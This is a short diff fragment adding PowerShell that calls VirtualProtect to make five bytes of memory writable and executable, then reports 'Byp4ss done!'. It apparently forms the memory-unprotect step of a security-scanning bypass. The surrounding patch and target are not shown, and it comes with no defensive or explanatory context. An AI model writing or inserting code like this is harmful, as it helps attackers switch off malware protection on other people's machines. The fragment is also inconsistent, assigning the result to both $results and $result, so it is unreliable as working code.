@@ -1,0 +1,9 @@
+if ([Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p))
+      {
+      $good = $true
+      $results = "Byp4ss done! "
+      } 
+ else
+    {
+      $result = "No Byp4ss"
+     }  
